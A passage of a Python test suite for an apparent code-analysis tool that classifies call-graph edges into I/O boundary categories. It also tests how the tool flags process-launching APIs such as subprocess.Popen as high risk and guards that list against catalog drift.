        Post Phase-3 (WI-mifor-vabul): folded to 'calls' + meta['bridge_kind']='cgo'.
        """
        catalog = load_catalog("c")
        edges = [
            self._make_edge(src="go_main", dst="go_wrapper"),
            self._make_edge(src="go_wrapper", dst="c_impl", edge_type="calls"),
            self._make_edge(src="c_impl", dst="c:external:0-0:fopen:unresolved"),
        ]
        entrypoint_ids = {"go_main"}

        bmap = compute_boundary_map(edges, {"c": catalog}, entrypoint_ids=entrypoint_ids)
        assert bmap.total_io_edges >= 1
        fs_entry = bmap.entries.get("fs_read")
        assert fs_entry is not None
        assert "go_main" in fs_entry.entry_points

    def test_ffi_bridge_edge_traced_to_entrypoint(self) -> None:
        """Entry-point trace crosses ffi bridge edges (Python→Rust).

        Post Phase-3 (WI-mifor-vabul): folded to 'calls' + meta['bridge_kind']='ffi'.
        """
        catalog = load_catalog("python")
        edges = [
            self._make_edge(src="py_main", dst="py_wrapper"),
            self._make_edge(src="py_wrapper", dst="rust_impl", edge_type="calls"),
            self._make_edge(src="rust_impl", dst="python:os:0-0:listdir:function"),
        ]
        entrypoint_ids = {"py_main"}

        bmap = compute_boundary_map(edges, {"python": catalog}, entrypoint_ids=entrypoint_ids)
        assert bmap.total_io_edges >= 1
        fs_entry = bmap.entries.get("fs_read")
        assert fs_entry is not None
        assert "py_main" in fs_entry.entry_points

    def test_unreachable_entry_point_excluded(self) -> None:
        """Entrypoints that can't reach IO are not included."""
        catalog = load_catalog("python")
        edges = [
            self._make_edge(src="main_io", dst="python:os:0-0:listdir:function"),
            self._make_edge(src="main_noio", dst="pure_func"),
        ]
        entrypoint_ids = {"main_io", "main_noio"}

        bmap = compute_boundary_map(edges, {"python": catalog}, entrypoint_ids=entrypoint_ids)
        fs_entry = bmap.entries["fs_read"]
        assert "main_io" in fs_entry.entry_points
        assert "main_noio" not in fs_entry.entry_points


class TestLeafCallerExpansion:
    """Tests for WI-darad: expand collapsed sinks into per-leaf-caller roll-ups.

    When many concrete functions share a helper that calls a primitive, the
    collapsed entry_points roll-up loses the association between entry points
    and the concrete caller path. leaf_callers / entry_points_per_leaf surface
    that association without materializing full paths per chain.
    """

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_leaf_callers_surface_concrete_notifiers(self) -> None:
        """Two concrete Notifier.Notify funcs share a 'request' helper that
        calls http.NewRequest. leaf_callers must contain both Notifiers."""
        catalog = load_catalog("go")
        edges = [
            self._make_edge(
                src="go:/api.go:1:postAlertsHandler:function",
                dst="go:/notify.go:1:slack_Notify:function",
            ),
            self._make_edge(
                src="go:/api.go:1:postAlertsHandler:function",
                dst="go:/notify.go:1:discord_Notify:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:slack_Notify:function",
                dst="go:/notify.go:1:request:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:discord_Notify:function",
                dst="go:/notify.go:1:request:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:request:function",
                dst="go:net/http:0-0:NewRequest:unresolved",
            ),
        ]
        entrypoint_ids = {"go:/api.go:1:postAlertsHandler:function"}
        bmap = compute_boundary_map(
            edges, {"go": catalog}, entrypoint_ids=entrypoint_ids
        )
        net_entry = bmap.entries.get("net_send")
        assert net_entry is not None
        assert "go:/notify.go:1:slack_Notify:function" in net_entry.leaf_callers
        assert "go:/notify.go:1:discord_Notify:function" in net_entry.leaf_callers

    def test_entry_points_per_leaf_distinguishes_reach(self) -> None:
        """Two handlers reach the shared helper via disjoint Notifiers.
        entry_points_per_leaf must keep the EP→leaf association."""
        catalog = load_catalog("go")
        edges = [
            self._make_edge(
                src="go:/api.go:1:postSlackHandler:function",
                dst="go:/notify.go:1:slack_Notify:function",
            ),
            self._make_edge(
                src="go:/api.go:1:postDiscordHandler:function",
                dst="go:/notify.go:1:discord_Notify:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:slack_Notify:function",
                dst="go:/notify.go:1:request:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:discord_Notify:function",
                dst="go:/notify.go:1:request:function",
            ),
            self._make_edge(
                src="go:/notify.go:1:request:function",
                dst="go:net/http:0-0:NewRequest:unresolved",
            ),
        ]
        entrypoint_ids = {
            "go:/api.go:1:postSlackHandler:function",
            "go:/api.go:1:postDiscordHandler:function",
        }
        bmap = compute_boundary_map(
            edges, {"go": catalog}, entrypoint_ids=entrypoint_ids
        )
        net_entry = bmap.entries["net_send"]
        per_leaf = net_entry.entry_points_per_leaf
        slack_leaf = "go:/notify.go:1:slack_Notify:function"
        discord_leaf = "go:/notify.go:1:discord_Notify:function"
        assert per_leaf[slack_leaf] == [
            "go:/api.go:1:postSlackHandler:function"
        ]
        assert per_leaf[discord_leaf] == [
            "go:/api.go:1:postDiscordHandler:function"
        ]

    def test_leaf_caller_is_io_src_when_no_callers(self) -> None:
        """When io_edge_src has no callers, it itself is the leaf."""
        catalog = load_catalog("python")
        edges = [
            self._make_edge(
                src="python:/a.py:1:f:function",
                dst="python:/os.py:1:os.listdir:function",
            ),
        ]
        bmap = compute_boundary_map(edges, {"python": catalog})
        fs_entry = bmap.entries["fs_read"]
        assert fs_entry.leaf_callers == ["python:/a.py:1:f:function"]

    def test_leaf_rollups_in_to_dict(self) -> None:
        """leaf_callers and entry_points_per_leaf appear in JSON output."""
        catalog = load_catalog("python")
        edges = [
            self._make_edge(src="main", dst="helper"),
            self._make_edge(src="helper", dst="python:os:0-0:listdir:function"),
        ]
        bmap = compute_boundary_map(
            edges, {"python": catalog}, entrypoint_ids={"main"}
        )
        d = bmap.to_dict()
        fs = d["boundaries"]["fs_read"]
        assert "leaf_callers" in fs
        assert "entry_points_per_leaf" in fs
        assert "main" in fs["leaf_callers"]
        assert fs["entry_points_per_leaf"]["main"] == ["main"]


class TestHighRiskPrimitives:
    """Tests for the high-risk primitive classification."""

    def test_is_high_risk_subprocess(self) -> None:
        assert is_high_risk("subprocess.Popen") is True
        assert is_high_risk("subprocess.run") is True
        assert is_high_risk("os.execv") is True

    def test_destructive_fs_not_high_risk(self) -> None:
        # Retired: destructive-fs risk is carried by the taint host_fs sink
        # (ADR-0017 §2b), not the subprocess-scoped high_risk display flag.
        assert is_high_risk("shutil.rmtree") is False
        assert is_high_risk("os.remove") is False

    def test_network_egress_not_high_risk(self) -> None:
        # Retired: network-egress risk is carried by the taint network sink
        # + chain dst_tier (WI-gitad / WI-jihuj), not high_risk. This also
        # reverts WI-tijos Part A's urlretrieve addition.
        assert is_high_risk("urllib.request.urlopen") is False
        assert is_high_risk("urllib.request.urlretrieve") is False
        assert is_high_risk("socket.socket.send") is False

    def test_not_high_risk(self) -> None:
        assert is_high_risk("os.listdir") is False
        assert is_high_risk("pathlib.Path.read_text") is False
        assert is_high_risk("os.walk") is False

    def test_high_risk_go(self) -> None:
        assert is_high_risk("os/exec.Command") is True

    def test_high_risk_java(self) -> None:
        assert is_high_risk("java.lang.ProcessBuilder.start") is True

    def test_high_risk_rust(self) -> None:
        assert is_high_risk("std::process::Command.spawn") is True

    def test_high_risk_javascript(self) -> None:
        assert is_high_risk("child_process.exec") is True
        assert is_high_risk("child_process.spawn") is True

    def test_high_risk_c(self) -> None:
        assert is_high_risk("unistd.fork") is True
        assert is_high_risk("stdlib.system") is True

    def test_frozenset_immutable(self) -> None:
        assert isinstance(HIGH_RISK_PRIMITIVES, frozenset)


CATALOG_LANGUAGES: tuple[str, ...] = (
    "python", "go", "java", "rust", "javascript", "c",
    "cpp", "elixir", "erlang", "kotlin", "scala",
    "swift", "objc", "haskell",
)


def _format_subprocess_drift_message(
    unclassified: list[tuple[str, str]],
) -> str:
    """Format the assertion message for the Part 2 drift guard (WI-sugav).

    The shape of this message is the human-facing UI of the drift guard:
    when a contributor adds a subprocess-boundary primitive to a YAML
    catalog but forgets to classify it in ``io_boundary.py``, this is
    what they see in CI. WI-sugav specifies five required sections, in
    this order, and the formatter unit test (below) locks the shape:

    1. One-line header naming the rule, the count, and the WI ID.
    2. WHY THIS MATTERS — plain-language explanation for a reader who
       hasn't internalised what ``has_high_risk`` is.
    3. UNCLASSIFIED PRIMITIVES — sorted, with source catalog in parens.
    4. HOW TO FIX — absolute file path + (a)/(b) decision rule with
       concrete examples.
    5. Exact pytest command to re-run after the fix.
    """
    count = len(unclassified)
    sorted_entries = sorted(unclassified)
    max_name = max((len(q) for q, _ in sorted_entries), default=0)
    primitive_lines = "\n".join(
        f"  {q.ljust(max_name)}  ({lang}.yaml)"
        for q, lang in sorted_entries
    )
    return (
        "HIGH_RISK_PRIMITIVES drift guard (Part 2, WI-sugav): "
        f"{count} subprocess-boundary\n"
        "primitives are present in io_primitives YAML catalogs but not classified\n"
        "in io_boundary.py.\n"
        "\n"
        "WHY THIS MATTERS:\n"
        "  A primitive with boundary=subprocess is a process-launching API\n"
        "  (subprocess.Popen, Runtime.exec, os.system, and friends). We want every\n"
        "  such primitive to have an explicit \"high-risk\" classification so the\n"
        "  has_high_risk=True flag fires consistently when a user analyzes a\n"
        "  repo that calls into one. Each unclassified entry below is silently\n"
        "  falling through — the catalog tracks it for taint analysis, but the\n"
        "  high-risk display flag never fires.\n"
        "\n"
        "UNCLASSIFIED PRIMITIVES:\n"
        f"{primitive_lines}\n"
        "\n"
        "HOW TO FIX:\n"
        "  Edit packages/hypergumbo-core/src/hypergumbo_core/io_boundary.py and,\n"
        "  for each primitive above, pick ONE of:\n"
        "\n"
        "  (a) Add to HIGH_RISK_PRIMITIVES (the common case).\n"
        "      Pick this if the primitive launches an arbitrary subprocess\n"
        "      — i.e., calls of the shape \"run this command string with these\n"
        "      args, give me the result.\" This is what subprocess.Popen,\n"
        "      Runtime.exec, os.system, and Process.spawn all do.\n"
        "\n"
        "  (b) Add to HIGH_RISK_EXEMPTIONS_SUBPROCESS with an inline comment\n"
        "      explaining why (the rare case). Pick this if the primitive is\n"
        "      technically boundary=subprocess in the catalog but doesn't represent\n"
        "      arbitrary code execution — e.g., it's a thin wrapper around a\n"
        "      single known utility (`git`-only, `docker`-only) that's already\n"
        "      classified elsewhere, or it operates on an already-launched\n"
        "      process (wait, signal, cleanup).\n"
        "\n"
        "  After editing, re-run "
        "`pytest packages/hypergumbo-core/tests/"
        "test_io_boundary.py::TestHighRiskPrimitivesDriftGuard`\n"
        "  and the test should pass.\n"
        "\n"
        "See WI-sugav (tracker item) for the design rationale."
    )


class TestHighRiskPrimitivesDriftGuard:
    """WI-gitad / WI-sugav: HIGH_RISK_PRIMITIVES ↔ catalog drift guard (both directions)."""

    def test_every_high_risk_entry_exists_in_a_catalog(self) -> None:
        """Phantom detection (Part 1, WI-gitad): no HIGH_RISK_PRIMITIVES entry without a catalog match."""
        all_qualified: set[str] = set()
        for lang in CATALOG_LANGUAGES:
            cat = load_catalog(lang)
            for p in cat.primitives:
                all_qualified.add(p.qualified_name)

        phantoms = sorted(HIGH_RISK_PRIMITIVES - all_qualified)
        assert phantoms == [], (
            f"HIGH_RISK_PRIMITIVES entries not found in any io_primitives YAML catalog "
            f"(phantom entries — the high_risk flag never fires for these): {phantoms}"
        )

    def test_every_subprocess_boundary_primitive_is_classified(self) -> None:
        """Missing-entry detection (Part 2, WI-sugav).

        For every catalog entry with ``boundary == "subprocess"``, the
        qualified name must be present in either ``HIGH_RISK_PRIMITIVES``
        (the common case — entry represents arbitrary code execution) or
        ``HIGH_RISK_EXEMPTIONS_SUBPROCESS`` (the rare case — entry is
        subprocess-boundary for taint tracking but isn't arbitrary
        execution, e.g., wait/signal/PATH-lookup).

        The failure message conforms to the WI-sugav spec — see
        ``_format_subprocess_drift_message`` for the contract, which is
        independently verified by
        ``test_subprocess_drift_message_formatter_shape``.
        """
        unclassified: list[tuple[str, str]] = []
        for lang in CATALOG_LANGUAGES:
            for p in load_catalog(lang).primitives:
                if p.boundary != "subprocess":
                    continue
                q = p.qualified_name
                if q in HIGH_RISK_PRIMITIVES:
                    continue
                if q in HIGH_RISK_EXEMPTIONS_SUBPROCESS:
                    continue
                unclassified.append((q, lang))

        assert not unclassified, _format_subprocess_drift_message(unclassified)

    def test_subprocess_drift_message_formatter_shape(self) -> None:
        """Spec compliance: the formatter produces the verbatim WI-sugav shape.

        Locks the five required structural elements (header, WHY, list,
        HOW TO FIX, re-run command) and key prose anchors so a future
        refactor can't silently drop the developer-facing scaffolding.
        """
        msg = _format_subprocess_drift_message([
            ("kotlin.lang.Runtime.exec", "kotlin"),
            ("scala.sys.process.Process.apply", "scala"),
        ])
        # (1) one-line header: rule name + count + WI ID
        assert msg.startswith(
            "HIGH_RISK_PRIMITIVES drift guard (Part 2, WI-sugav): 2 subprocess-boundary"
        )
        # (2) WHY THIS MATTERS section with plain-language anchor
        assert "WHY THIS MATTERS:" in msg
        assert "process-launching API" in msg
        assert "has_high_risk=True flag fires" in msg
        # (3) UNCLASSIFIED PRIMITIVES — sorted, with source catalog in parens
        assert "UNCLASSIFIED PRIMITIVES:" in msg
        kotlin_idx = msg.index("kotlin.lang.Runtime.exec")
        scala_idx = msg.index("scala.sys.process.Process.apply")
        assert kotlin_idx < scala_idx
        assert "(kotlin.yaml)" in msg
        assert "(scala.yaml)" in msg
        # (4) HOW TO FIX — absolute path + (a)/(b) + decision rule with examples
        assert "HOW TO FIX:" in msg
        assert "packages/hypergumbo-core/src/hypergumbo_core/io_boundary.py" in msg
        assert "(a) Add to HIGH_RISK_PRIMITIVES" in msg
        assert "(b) Add to HIGH_RISK_EXEMPTIONS_SUBPROCESS" in msg
        assert "subprocess.Popen" in msg
        assert "Runtime.exec" in msg
        # (5) exact pytest re-run command (one copy-paste away from verifying the fix)
        assert (
            "pytest packages/hypergumbo-core/tests/"
            "test_io_boundary.py::TestHighRiskPrimitivesDriftGuard" in msg
        )
        # Tracker back-reference
        assert "See WI-sugav (tracker item)" in msg

    def test_subprocess_drift_message_empty_input_is_well_formed(self) -> None:
        """Edge case: an empty list still produces a structurally valid message.

        The drift-guard test never invokes the formatter with an empty
        list (the assert short-circuits), but a unit test of the
        formatter must cover the empty path so future refactors can't
        regress it into raising on ``max(...)`` of an empty iterable.
        """
        msg = _format_subprocess_drift_message([])
        assert msg.startswith(
            "HIGH_RISK_PRIMITIVES drift guard (Part 2, WI-sugav): 0 subprocess-boundary"
        )
        assert "UNCLASSIFIED PRIMITIVES:" in msg

    def test_high_risk_and_exemption_sets_are_disjoint(self) -> None:
        """An entry can be HIGH_RISK_PRIMITIVES or HIGH_RISK_EXEMPTIONS_SUBPROCESS, not both.

        The drift guard treats either set as "classified", so an entry
        listed in both would silently bypass the gate. Explicit
        disjointness check makes that mistake impossible.
        """
        overlap = HIGH_RISK_PRIMITIVES & HIGH_RISK_EXEMPTIONS_SUBPROCESS
        assert overlap == set(), (
            f"HIGH_RISK_PRIMITIVES and HIGH_RISK_EXEMPTIONS_SUBPROCESS overlap on "
            f"{sorted(overlap)}; an entry must land in exactly one."
        )


class TestIoChainToDict:
    """Tests for IoChain.to_dict() serialization."""

    def test_basic_serialization(self) -> None:
        chain = IoChain(
            boundary="fs_read",
            primitive="os.listdir",
            io_edge_src="python:/a.py:1-5:f:function",
            io_edge_dst="python:/os.py:100:os.listdir:function",
            entry_points=["main"],
        )
        d = chain.to_dict()
        assert d["boundary"] == "fs_read"
        assert d["primitive"] == "os.listdir"
        assert d["io_edge_src"] == "python:/a.py:1-5:f:function"
        assert d["io_edge_dst"] == "python:/os.py:100:os.listdir:function"
        assert d["entry_points"] == ["main"]
        assert d["high_risk"] is False

    def test_high_risk_chain(self) -> None:
        chain = IoChain(
            boundary="subprocess",
            primitive="subprocess.Popen",
            io_edge_src="python:/a.py:1:f:function",
            io_edge_dst="python:/sub.py:1:subprocess.Popen:function",
        )
        d = chain.to_dict()
        assert d["high_risk"] is True


class TestIoChainTierFields:
    """Tests for IoChain dst_tier surfacing (PR2 of stop-stripping plan).

    Once boundary nodes are addressable from disk-loaded JSON (PR1), the
    natural extension is to expose the destination's supply_chain.tier on
    each chain so verify-claims / sketch / external consumers can
    distinguish "first-party network call" from "first-party calls into
    a tier-3 wrapper that may make a network call" without the catalog
    needing to enumerate every popular wrapper.
    """

    def test_dst_tier_populated_when_boundary_node_in_lookup(self) -> None:
        # Boundary node carries supply_chain.tier=3 (or 2 for direct deps).
        # When compute_boundary_map is given a nodes_by_id lookup, the chain
        # picks up the tier from the dst Symbol record.
        from hypergumbo_core.io_boundary import compute_boundary_map

        # Mock edge — calls into urllib.request.urlopen
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        edge = MockEdge(
            src="python:/app/fetch.py:5-10:fetch:function",
            dst="python:urllib.request:0-0:urlopen:unresolved",
            edge_type="calls",
        )
        # Boundary node as a dict (matches what behavior_map["nodes"] holds
        # after JSON round-trip).
        nodes_by_id = {
            "python:urllib.request:0-0:urlopen:unresolved": {
                "id": "python:urllib.request:0-0:urlopen:unresolved",
                "name": "urlopen",
                "kind": "external_symbol",
                "language": "python",
                "path": "<external>",
                "meta": {"external_boundary": True},
                "supply_chain": {"tier": 3, "tier_name": "external_dep"},
            },
        }
        catalog = load_catalog("python")
        bmap = compute_boundary_map([edge], {"python": catalog},
                                     nodes_by_id=nodes_by_id)
        net_send = bmap.entries.get("net_send")
        assert net_send is not None and len(net_send.chains) == 1
        chain = net_send.chains[0]
        assert chain.dst_tier == 3
        assert chain.dst_tier_name == "external_dep"
        assert chain.dst_external_boundary is True

    def test_dst_tier_none_when_nodes_not_provided(self) -> None:
        # Backwards-compat: pre-PR1 JSON files lack boundary nodes; the
        # tier lookup yields None and serialization tolerates it.
        from hypergumbo_core.io_boundary import compute_boundary_map
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        edge = MockEdge(
            src="python:/app/fetch.py:5-10:fetch:function",
            dst="python:urllib.request:0-0:urlopen:unresolved",
            edge_type="calls",
        )
        catalog = load_catalog("python")
        bmap = compute_boundary_map([edge], {"python": catalog})
        chain = bmap.entries["net_send"].chains[0]
        assert chain.dst_tier is None
        assert chain.dst_tier_name is None
        assert chain.dst_external_boundary is False
        # to_dict still works.
        d = chain.to_dict()
        assert d["dst_tier"] is None
        assert d["dst_tier_name"] is None
        assert d["dst_external_boundary"] is False

    def test_dst_tier_picks_up_real_symbol_tier(self) -> None:
        # When the dst is a real first-party Symbol (not a boundary), the
        # chain still carries that symbol's tier so downstream reasoning
        # treats "first-party calls first-party I/O wrapper" distinctly
        # from "first-party calls third-party wrapper".
        from hypergumbo_core.io_boundary import compute_boundary_map
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        edge = MockEdge(
            src="python:/app/fetch.py:5-10:fetch:function",
            dst="python:urllib.request:0-0:urlopen:unresolved",
            edge_type="calls",
        )
        nodes_by_id = {
            "python:urllib.request:0-0:urlopen:unresolved": {
                "id": "python:urllib.request:0-0:urlopen:unresolved",
                "kind": "function",
                "supply_chain": {"tier": 1, "tier_name": "first_party"},
                # No external_boundary meta — this is a real first-party symbol.
            },
        }
        catalog = load_catalog("python")
        bmap = compute_boundary_map([edge], {"python": catalog},
                                     nodes_by_id=nodes_by_id)
        chain = bmap.entries["net_send"].chains[0]
        assert chain.dst_tier == 1
        assert chain.dst_tier_name == "first_party"
        assert chain.dst_external_boundary is False


class TestIoBoundariesEnvelopeSchema:
    """Plan PR-B: io-boundaries --json envelope schema_version freeze.

    The io-boundaries envelope is a *separate* contract from the
    behavior-map envelope (which has its own ``schema_version``
    starting at 0.1.0 per cli.py). The io-boundaries envelope had no
    version field prior to PR-B; this test class pins ``1.0`` as the
    inaugural value and locks the top-level shape so any change to
    the wire format must consciously bump the version.
    """

    def test_io_boundaries_schema_version_constant_pinned(self) -> None:
        """The exported constant pins ``2.1`` (bumped from 2.0 by WI-javoh: the
        new command_launch_edges disclosure key; 2.0 was WI-huhit/WI-foduh —
        total_io_edges redefined to real categories + external_potential_edges).
        """
        assert IO_BOUNDARIES_SCHEMA_VERSION == "2.1", (
            "io-boundaries schema_version is a wire-format contract. "
            "Do NOT change the value without bumping it deliberately "
            "AND updating the inline schema docs + CHANGELOG."
        )

    def test_boundary_map_to_dict_includes_schema_version(self) -> None:
        bmap = BoundaryMap()
        d = bmap.to_dict()
        assert d.get("schema_version") == IO_BOUNDARIES_SCHEMA_VERSION

    def test_boundary_map_to_dict_top_level_keys_locked(self) -> None:
        """Top-level envelope keys are part of the wire contract."""
        bmap = BoundaryMap()
        d = bmap.to_dict()
        # The exact set of top-level keys produced by ``to_dict()``.
        # ``unsupported_languages`` is added by ``cmd_io_boundaries`` in
        # cli.py (it's not part of BoundaryMap state), so it's not in
        # this lock-set; the CLI integration test below covers it.
        expected_keys = {
            "schema_version", "total_io_edges", "external_potential_edges",
            "command_launch_edges", "boundaries",
        }
        assert set(d.keys()) == expected_keys, (
            f"Unexpected top-level keys in BoundaryMap.to_dict(): "
            f"got {sorted(d.keys())}, expected {sorted(expected_keys)}. "
            f"Adding/removing keys is a wire-format change — bump "
            f"IO_BOUNDARIES_SCHEMA_VERSION and update this test."
        )

    def test_boundary_map_to_dict_value_types_locked(self) -> None:
        """Top-level value types are part of the wire contract."""
        bmap = BoundaryMap()
        d = bmap.to_dict()
        assert isinstance(d["schema_version"], str)
        assert isinstance(d["total_io_edges"], int)
        assert isinstance(d["external_potential_edges"], int)
        assert isinstance(d["command_launch_edges"], int)
        assert isinstance(d["boundaries"], dict)


class TestBoundaryMapEntryEnriched:
    """Tests for enriched BoundaryMapEntry.to_dict()."""

    def test_includes_primitive_counts(self) -> None:
        entry = BoundaryMapEntry(boundary="fs_read")
        entry.chains = [
            IoChain("fs_read", "os.listdir", "s1", "d1"),
            IoChain("fs_read", "os.listdir", "s2", "d2"),
            IoChain("fs_read", "os.walk", "s3", "d3"),
        ]
        entry.primitives_used = ["os.listdir", "os.walk"]
        d = entry.to_dict()
        assert d["primitive_counts"] == {"os.listdir": 2, "os.walk": 1}

    def test_includes_chains(self) -> None:
        entry = BoundaryMapEntry(boundary="subprocess")
        entry.chains = [
            IoChain("subprocess", "subprocess.run", "s1", "d1"),
        ]
        entry.primitives_used = ["subprocess.run"]
        d = entry.to_dict()
        assert len(d["chains"]) == 1
        assert d["chains"][0]["primitive"] == "subprocess.run"

    def test_has_high_risk_true(self) -> None:
        entry = BoundaryMapEntry(boundary="subprocess")
        entry.chains = [
            IoChain("subprocess", "subprocess.Popen", "s1", "d1"),
            IoChain("subprocess", "os.system", "s2", "d2"),
        ]
        d = entry.to_dict()
        assert d["has_high_risk"] is True

    def test_has_high_risk_false(self) -> None:
        entry = BoundaryMapEntry(boundary="fs_read")
        entry.chains = [
            IoChain("fs_read", "os.listdir", "s1", "d1"),
        ]
        d = entry.to_dict()
        assert d["has_high_risk"] is False

    def test_backward_compatible_fields(self) -> None:
        """Existing fields (boundary, chain_count, entry_points, primitives_used) preserved."""
        entry = BoundaryMapEntry(
            boundary="fs_read",
            chains=[IoChain("fs_read", "os.listdir", "s1", "d1")],
            entry_points=["main"],
            primitives_used=["os.listdir"],
        )
        d = entry.to_dict()
        assert d["boundary"] == "fs_read"
        assert d["chain_count"] == 1
        assert d["entry_points"] == ["main"]
        assert d["primitives_used"] == ["os.listdir"]


class TestExternalPotentialBucket:
    """Plan C, PR C: ``external_potential`` bucket in compute_boundary_map.

    After PR A culled all third-party wrappers from the catalog, calls
    into wrappers like ``huggingface_hub.snapshot_download`` no longer
    surface as ``net_send`` chains.  The structural answer (instead of
    re-adding wrappers one-by-one) is to synthesize ``external_potential``
    chains for every edge whose dst is a tier-3 boundary node not in any
    catalog.  This surfaces "first-party code reaches into untrusted
    territory" as a first-class signal alongside ``net_send`` /
    ``fs_read`` / etc., without the catalog having to enumerate every
    popular wrapper.

    The bucket is gated on ``status: complete`` for the source
    language's catalog: in_progress catalogs flag chains as
    ``dst_classification_unreliable=True`` so users see them but know
    the absence-of-catalog-hit isn't authoritative.
    """

    def _mock_edge(
        self,
        src: str,
        dst: str,
        edge_type: str = "calls",
        is_resolved: bool = True,
    ):
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None
            is_resolved: bool = True

        return MockEdge(
            src=src, dst=dst, edge_type=edge_type, is_resolved=is_resolved,
        )

    def _boundary_node(
        self, dst_id: str, name: str, lang: str = "python", tier: int = 3,
        tier_name: str = "external_dep",
    ) -> dict:
        return {
            "id": dst_id,
            "name": name,
            "kind": "external_symbol",
            "language": lang,
            "path": "<external>",
            "meta": {"external_boundary": True},
            "supply_chain": {"tier": tier, "tier_name": tier_name},
        }

    def test_unmatched_edge_to_tier3_boundary_emits_external_potential_chain(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # huggingface_hub.snapshot_download is no longer in the catalog
        # (PR A removed third-party wrappers). Without external_potential,
        # this call would be entirely invisible.
        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edge = self._mock_edge(
            src="python:/app/load.py:5-10:load_model:function",
            dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None, "external_potential bucket must be emitted"
        assert len(ext.chains) == 1
        chain = ext.chains[0]
        assert chain.boundary == "external_potential"
        assert "snapshot_download" in chain.primitive
        assert chain.dst_external_boundary is True
        assert chain.dst_tier == 3
        assert chain.dst_tier_name == "external_dep"

    def test_catalog_matched_edge_does_not_appear_in_external_potential(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # urllib.request.urlopen IS in the catalog → net_send.
        # external_potential must NOT also include it (no double-counting).
        dst = "python:urllib.request:0-0:urlopen:unresolved"
        edge = self._mock_edge(
            src="python:/app/fetch.py:5-10:fetch:function",
            dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "urlopen")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        net_send = bmap.entries.get("net_send")
        assert net_send is not None and len(net_send.chains) == 1
        # The same edge MUST NOT also be in external_potential.
        ext = bmap.entries.get("external_potential")
        if ext is not None:
            for chain in ext.chains:
                assert chain.io_edge_dst != dst, (
                    "catalog-matched edge leaked into external_potential"
                )

    def test_total_io_edges_excludes_external_potential_disclosed_separately(
        self,
    ) -> None:
        """WI-huhit/WI-foduh: ``total_io_edges`` is the real/verified I/O
        surface (excl ``external_potential``); ``external_potential_edges``
        discloses the bucket separately so it no longer inflates the headline.
        """
        from hypergumbo_core.io_boundary import compute_boundary_map

        # One real net_send (urlopen, in catalog) + one external_potential
        # (snapshot_download, unresolved wrapper not in any catalog).
        real_dst = "python:urllib.request:0-0:urlopen:unresolved"
        ep_dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edges = [
            self._mock_edge("python:/app/a.py:1-2:f:function", real_dst),
            self._mock_edge("python:/app/b.py:1-2:g:function", ep_dst),
        ]
        nodes_by_id = {
            real_dst: self._boundary_node(real_dst, "urlopen"),
            ep_dst: self._boundary_node(ep_dst, "snapshot_download"),
        }
        bmap = compute_boundary_map(
            edges, {"python": load_catalog("python")}, nodes_by_id=nodes_by_id,
        )
        # Both buckets exist...
        assert bmap.entries["net_send"].chains  # real
        assert bmap.entries["external_potential"].chains  # unverified noise
        # ...but the headline counts ONLY the real category; external_potential
        # is disclosed in its own field (not folded into total_io_edges).
        assert bmap.total_io_edges == 1
        assert bmap.external_potential_edges == 1
        d = bmap.to_dict()
        assert d["total_io_edges"] == 1
        assert d["external_potential_edges"] == 1

    def test_in_progress_language_emits_chain_with_unreliable_annotation(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # Go's catalog is status=in_progress (until per-language follow-up
        # promotes it). Unmatched calls into Go boundary nodes still
        # surface in external_potential, but each chain is annotated with
        # dst_classification_unreliable=True so the user knows the
        # absence-of-catalog-hit isn't authoritative.
        dst = "go:github.com/some/wrapper:0-0:Fetch:unresolved"
        edge = self._mock_edge(
            src="go:/app/main.go:5-10:run:function",
            dst=dst,
        )
        nodes_by_id = {
            dst: self._boundary_node(dst, "Fetch", lang="go"),
        }
        bmap = compute_boundary_map(
            [edge],
            {"go": load_catalog("go")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1
        assert ext.chains[0].dst_classification_unreliable is True

    def test_complete_language_chain_is_not_marked_unreliable(self) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edge = self._mock_edge(
            src="python:/app/load.py:5-10:load_model:function",
            dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        chain = bmap.entries["external_potential"].chains[0]
        assert chain.dst_classification_unreliable is False

    def test_external_potential_chain_carries_dst_tier_and_qualified_name(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        dst = "python:sentence_transformers:0-0:SentenceTransformer:unresolved"
        edge = self._mock_edge(
